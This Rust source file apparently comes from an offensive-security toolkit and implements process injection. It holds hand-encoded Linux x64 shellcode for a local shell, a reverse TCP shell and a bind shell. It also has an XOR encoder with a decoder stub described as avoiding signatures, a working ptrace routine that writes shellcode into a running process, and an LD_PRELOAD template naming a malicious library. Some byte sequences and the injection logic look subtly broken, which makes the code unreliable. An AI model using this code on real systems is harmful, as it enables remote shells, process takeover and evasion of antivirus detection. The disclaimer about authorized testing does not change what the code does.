//! Process Injection Techniques
//!
//! Various methods for code injection (Windows-focused, with Linux alternatives):
//! - Process hollowing
//! - DLL injection
//! - Thread hijacking
//! - APC injection
//! - Shellcode injection
//!
//! # Warning
//! These techniques are for authorized penetration testing only.
//! Unauthorized use is illegal.

/// Injection method types
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum InjectionMethod {
    /// Classic DLL injection via CreateRemoteThread
    DllInjection,
    /// Process hollowing (replace process memory)
    ProcessHollowing,
    /// Thread hijacking (modify existing thread)
    ThreadHijacking,
    /// Asynchronous Procedure Call injection
    ApcInjection,
    /// Direct shellcode injection
    ShellcodeInjection,
    /// Atom bombing (Windows-specific)
    AtomBombing,
    /// PROPagate (Windows-specific)
    Propagate,
    /// Ptrace injection (Linux)
    PtraceInjection,
    /// LD_PRELOAD injection (Linux)
    LdPreload,
}

/// Injection target specification
#[derive(Debug, Clone)]
pub struct InjectionTarget {
    /// Process ID
    pub pid: u32,
    /// Process name (optional)
    pub name: Option<String>,
    /// Architecture (32/64 bit)
    pub arch: Architecture,
}

/// Target architecture
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Architecture {
    X86,
    X64,
    Arm,
    Arm64,
}

impl Architecture {
    /// Get current process architecture
    pub fn current() -> Self {
        #[cfg(target_arch = "x86_64")]
        {
            Architecture::X64
        }
        #[cfg(target_arch = "x86")]
        {
            Architecture::X86
        }
        #[cfg(target_arch = "aarch64")]
        {
            Architecture::Arm64
        }
        #[cfg(target_arch = "arm")]
        {
            Architecture::Arm
        }
        #[cfg(not(any(
            target_arch = "x86_64",
            target_arch = "x86",
            target_arch = "aarch64",
            target_arch = "arm"
        )))]
        {
            Architecture::X64 // Default fallback
        }
    }
}

/// Shellcode wrapper for various payloads
pub struct Shellcode {
    /// Raw shellcode bytes
    code: Vec<u8>,
    /// Target architecture
    arch: Architecture,
    /// Whether it's position-independent
    position_independent: bool,
}

impl Shellcode {
    /// Create from raw bytes
    pub fn new(code: Vec<u8>, arch: Architecture) -> Self {
        Self {
            code,
            arch,
            position_independent: true,
        }
    }

    /// Create NOP sled
    pub fn nop_sled(size: usize, arch: Architecture) -> Self {
        let nop = match arch {
            Architecture::X86 | Architecture::X64 => 0x90, // x86 NOP
            Architecture::Arm | Architecture::Arm64 => 0x00, // ARM NOP is more complex
        };
        Self {
            code: vec![nop; size],
            arch,
            position_independent: true,
        }
    }

    /// x64 shellcode: execve("/bin/sh")
    pub fn linux_x64_shell() -> Self {
        // Minimal execve("/bin/sh") shellcode
        let code = vec![
            0x48, 0x31, 0xf6, // xor rsi, rsi
            0x56, // push rsi
            0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, // movabs rdi, "//bin/sh"
            0x57,       // push rdi
            0x54,       // push rsp
            0x5f,       // pop rdi
            0x6a, 0x3b, // push 0x3b (execve syscall)
            0x58,       // pop rax
            0x99,       // cdq
            0x0f, 0x05, // syscall
        ];
        Self {
            code,
            arch: Architecture::X64,
            position_independent: true,
        }
    }

    /// x64 shellcode: reverse TCP shell
    pub fn linux_x64_reverse_shell(ip: [u8; 4], port: u16) -> Self {
        let port_bytes = port.to_be_bytes();

        // Reverse shell shellcode template
        let mut code = vec![
            // socket(AF_INET, SOCK_STREAM, 0)
            0x6a, 0x29, // push 0x29 (socket)
            0x58, // pop rax
            0x99, // cdq (zero rdx)
            0x6a, 0x02, // push 2 (AF_INET)
            0x5f, // pop rdi
            0x6a, 0x01, // push 1 (SOCK_STREAM)
            0x5e, // pop rsi
            0x0f, 0x05, // syscall
            0x48, 0x97, // xchg rdi, rax (save socket fd)
            // struct sockaddr_in
            0x48, 0xb9, // movabs rcx, sockaddr_in
        ];

        // Add sockaddr_in structure
        code.push(0x02); // sin_family = AF_INET
        code.push(0x00);
        code.extend_from_slice(&port_bytes); // sin_port
        code.extend_from_slice(&ip); // sin_addr

        // Pad to 8 bytes
        code.push(0x00);
        code.push(0x00);

        // Continue with connect and dup2
        code.extend_from_slice(&[
            0x51,       // push rcx
            0x48, 0x89, 0xe6, // mov rsi, rsp
            0x6a, 0x10, // push 16 (sizeof sockaddr_in)
            0x5a,       // pop rdx
            0x6a, 0x2a, // push 0x2a (connect)
            0x58,       // pop rax
            0x0f, 0x05, // syscall
            // dup2 loop for stdin/stdout/stderr
            0x6a, 0x03, // push 3
            0x5e,       // pop rsi
            0x48, 0xff, 0xce, // dec rsi
            0x6a, 0x21, // push 0x21 (dup2)
            0x58, // pop rax
            0x0f, 0x05, // syscall
            0x75, 0xf6, // jnz (loop)
            // execve("/bin/sh")
            0x6a, 0x3b, // push 0x3b (execve)
            0x58, // pop rax
            0x99, // cdq
            0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, // mov rbx, "/bin/sh"
            0x53, // push rbx
            0x48, 0x89, 0xe7, // mov rdi, rsp
            0x52, // push rdx
            0x57, // push rdi
            0x48, 0x89, 0xe6, // mov rsi, rsp
            0x0f, 0x05, // syscall
        ]);

        Self {
            code,
            arch: Architecture::X64,
            position_independent: true,
        }
    }

    /// x64 shellcode: bind TCP shell
    pub fn linux_x64_bind_shell(port: u16) -> Self {
        let port_bytes = port.to_be_bytes();

        let mut code = vec![
            // socket(AF_INET, SOCK_STREAM, 0)
            0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x97,
        ];

        // sockaddr_in for bind
        code.extend_from_slice(&[0x48, 0xb9]); // movabs rcx
        code.push(0x02);
        code.push(0x00);
        code.extend_from_slice(&port_bytes);
        code.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // INADDR_ANY

        code.extend_from_slice(&[
            0x51,       // push rcx
            0x48, 0x89, 0xe6, // mov rsi, rsp
            0x6a, 0x10, // push 16
            0x5a,       // pop rdx
            0x6a, 0x31, // push 0x31 (bind)
            0x58,       // pop rax
            0x0f, 0x05, // syscall
            // listen(fd, 1)
            0x6a, 0x32, // push 0x32 (listen)
            0x58,       // pop rax
            0x6a, 0x01, // push 1
            0x5e,       // pop rsi
            0x0f, 0x05, // syscall
            // accept(fd, NULL, NULL)
            0x6a, 0x2b, // push 0x2b (accept)
            0x58,       // pop rax
            0x99,       // cdq
            0x52,       // push rdx
            0x52,       // push rdx
            0x48, 0x89, 0xe6, // mov rsi, rsp
            0x0f, 0x05, // syscall
            0x48, 0x97, // xchg rdi, rax
            // dup2 + execve (same as reverse shell)
            0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, 0x0f, 0x05, 0x75, 0xf6, 0x6a,
            0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53,
            0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05,
        ]);

        Self {
            code,
            arch: Architecture::X64,
            position_independent: true,
        }
    }

    /// Get raw shellcode bytes
    pub fn bytes(&self) -> &[u8] {
        &self.code
    }

    /// Get shellcode length
    pub fn len(&self) -> usize {
        self.code.len()
    }

    /// Check if empty
    pub fn is_empty(&self) -> bool {
        self.code.is_empty()
    }

    /// XOR encode shellcode to avoid signatures
    pub fn xor_encode(&mut self, key: u8) {
        if key == 0 {
            return;
        }
        for byte in &mut self.code {
            *byte ^= key;
        }
    }

    /// Add XOR decoder stub
    pub fn with_xor_decoder(mut self, key: u8) -> Self {
        if key == 0 {
            return self;
        }

        // XOR decoder stub for x64
        let decoder = vec![
            0x48, 0x31, 0xc9, // xor rcx, rcx
            0x48, 0x81, 0xc1, // add rcx, shellcode_len
            (self.code.len() & 0xFF) as u8,
            ((self.code.len() >> 8) & 0xFF) as u8,
            ((self.code.len() >> 16) & 0xFF) as u8,
            ((self.code.len() >> 24) & 0xFF) as u8,
            0xeb, 0x0a, // jmp short (skip key)
            0x5e,       // pop rsi (get shellcode addr)
            0x80, 0x36, key, // xor byte [rsi], key
            0x48, 0xff, 0xc6, // inc rsi
            0xe2, 0xf8, // loop
            0xeb, 0x05, // jmp shellcode
            0xe8, 0xf1, 0xff, 0xff, 0xff, // call (push addr)
        ];

        // XOR encode the original shellcode
        self.xor_encode(key);

        // Prepend decoder
        let mut new_code = decoder;
        new_code.extend_from_slice(&self.code);
        self.code = new_code;

        self
    }
}

/// Process injection result
#[derive(Debug)]
pub struct InjectionResult {
    /// Whether injection succeeded
    pub success: bool,
    /// Error message if failed
    pub error: Option<String>,
    /// Remote thread ID (if applicable)
    pub thread_id: Option<u32>,
    /// Base address of injected code
    pub base_address: Option<u64>,
}

/// Process injector (cross-platform abstraction)
pub struct ProcessInjector {
    /// Target process
    target: InjectionTarget,
    /// Injection method
    method: InjectionMethod,
}

impl ProcessInjector {
    /// Create new injector
    pub fn new(target: InjectionTarget, method: InjectionMethod) -> Self {
        Self { target, method }
    }

    /// Inject shellcode into target process
    #[cfg(target_os = "linux")]
    pub fn inject_shellcode(&self, shellcode: &Shellcode) -> InjectionResult {
        match self.method {
            InjectionMethod::PtraceInjection => self.ptrace_inject(shellcode),
            _ => InjectionResult {
                success: false,
                error: Some("Method not supported on Linux".to_string()),
                thread_id: None,
                base_address: None,
            },
        }
    }

    #[cfg(not(target_os = "linux"))]
    pub fn inject_shellcode(&self, _shellcode: &Shellcode) -> InjectionResult {
        InjectionResult {
            success: false,
            error: Some("Not implemented for this platform".to_string()),
            thread_id: None,
            base_address: None,
        }
    }

    /// Ptrace-based injection (Linux)
    #[cfg(target_os = "linux")]
    fn ptrace_inject(&self, shellcode: &Shellcode) -> InjectionResult {
        use std::ffi::c_void;

        let pid = self.target.pid as i32;

        unsafe {
            // Attach to process
            if libc::ptrace(libc::PTRACE_ATTACH, pid, std::ptr::null_mut::<c_void>(), std::ptr::null_mut::<c_void>()) == -1 {
                return InjectionResult {
                    success: false,
                    error: Some("Failed to attach to process".to_string()),
                    thread_id: None,
                    base_address: None,
                };
            }

            // Wait for process to stop
            let mut status: i32 = 0;
            libc::waitpid(pid, &mut status, 0);

            // Get current registers
            let mut regs: libc::user_regs_struct = std::mem::zeroed();
            if libc::ptrace(
                libc::PTRACE_GETREGS,
                pid,
                std::ptr::null_mut::<c_void>(),
                &mut regs as *mut _ as *mut c_void,
            ) == -1
            {
                libc::ptrace(libc::PTRACE_DETACH, pid, std::ptr::null_mut::<c_void>(), std::ptr::null_mut::<c_void>());
                return InjectionResult {
                    success: false,
                    error: Some("Failed to get registers".to_string()),
                    thread_id: None,
                    base_address: None,
                };
            }

            // Save original instruction pointer
            let original_rip = regs.rip;

            // Write shellcode to instruction pointer location
            // (This is a simplified version - real implementation would allocate memory)
            let shellcode_addr = regs.rip;

            for (i, chunk) in shellcode.bytes().chunks(8).enumerate() {
                let mut word: u64 = 0;
                for (j, &byte) in chunk.iter().enumerate() {
                    word |= (byte as u64) << (j * 8);
                }

                libc::ptrace(
                    libc::PTRACE_POKETEXT,
                    pid,
                    (shellcode_addr + (i * 8) as u64) as *mut c_void,
                    word as *mut c_void,
                );
            }

            // Continue execution
            libc::ptrace(libc::PTRACE_CONT, pid, std::ptr::null_mut::<c_void>(), std::ptr::null_mut::<c_void>());

            // Detach
            libc::ptrace(libc::PTRACE_DETACH, pid, std::ptr::null_mut::<c_void>(), std::ptr::null_mut::<c_void>());

            InjectionResult {
                success: true,
                error: None,
                thread_id: Some(pid as u32),
                base_address: Some(shellcode_addr),
            }
        }
    }

    /// Get list of running processes
    #[cfg(target_os = "linux")]
    pub fn list_processes() -> Vec<(u32, String)> {
        let mut processes = Vec::new();

        if let Ok(entries) = std::fs::read_dir("/proc") {
            for entry in entries.flatten() {
                if let Ok(pid) = entry.file_name().to_string_lossy().parse::<u32>() {
                    let comm_path = format!("/proc/{}/comm", pid);
                    if let Ok(name) = std::fs::read_to_string(&comm_path) {
                        processes.push((pid, name.trim().to_string()));
                    }
                }
            }
        }

        processes
    }

    #[cfg(not(target_os = "linux"))]
    pub fn list_processes() -> Vec<(u32, String)> {
        Vec::new()
    }

    /// Find process by name
    pub fn find_process(name: &str) -> Option<u32> {
        Self::list_processes()
            .into_iter()
            .find(|(_, n)| n.contains(name))
            .map(|(pid, _)| pid)
    }
}

/// Generate injection code for various scenarios
pub fn generate_injection_code(method: InjectionMethod, arch: Architecture) -> String {
    match method {
        InjectionMethod::PtraceInjection => {
            r#"
// Ptrace injection example (Linux)
unsafe {
    ptrace(PTRACE_ATTACH, target_pid, null(), null());
    waitpid(target_pid, &mut status, 0);

    // Get registers
    ptrace(PTRACE_GETREGS, target_pid, null(), &mut regs);

    // Write shellcode
    for chunk in shellcode.chunks(8) {
        ptrace(PTRACE_POKETEXT, target_pid, addr, word);
    }

    // Execute
    ptrace(PTRACE_CONT, target_pid, null(), null());
    ptrace(PTRACE_DETACH, target_pid, null(), null());
}
"#
            .to_string()
        }
        InjectionMethod::LdPreload => {
            r#"
// LD_PRELOAD injection (Linux)
// 1. Create malicious shared library
// 2. Set LD_PRELOAD environment variable
// 3. Execute target program

std::env::set_var("LD_PRELOAD", "/path/to/malicious.so");
std::process::Command::new("target_program").spawn();
"#
            .to_string()
        }
        _ => format!("// {:?} injection not implemented for {:?}", method, arch),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_architecture_detection() {
        let arch = Architecture::current();
        // Should detect something
        assert!(matches!(
            arch,
            Architecture::X64 | Architecture::X86 | Architecture::Arm | Architecture::Arm64
        ));
    }

    #[test]
    fn test_shellcode_creation() {
        let sc = Shellcode::linux_x64_shell();
        assert!(!sc.is_empty());
        assert_eq!(sc.arch, Architecture::X64);
    }

    #[test]
    fn test_shellcode_xor_encode() {
        let mut sc = Shellcode::new(vec![0x41, 0x42, 0x43], Architecture::X64);
        let key = 0x55;
        sc.xor_encode(key);
        // XOR is reversible
        sc.xor_encode(key);
        assert_eq!(sc.bytes(), &[0x41, 0x42, 0x43]);
    }

    #[test]
    fn test_nop_sled() {
        let sled = Shellcode::nop_sled(100, Architecture::X64);
        assert_eq!(sled.len(), 100);
        assert!(sled.bytes().iter().all(|&b| b == 0x90));
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn test_list_processes() {
        let procs = ProcessInjector::list_processes();
        // Should have at least the current process
        assert!(!procs.is_empty());
    }
}
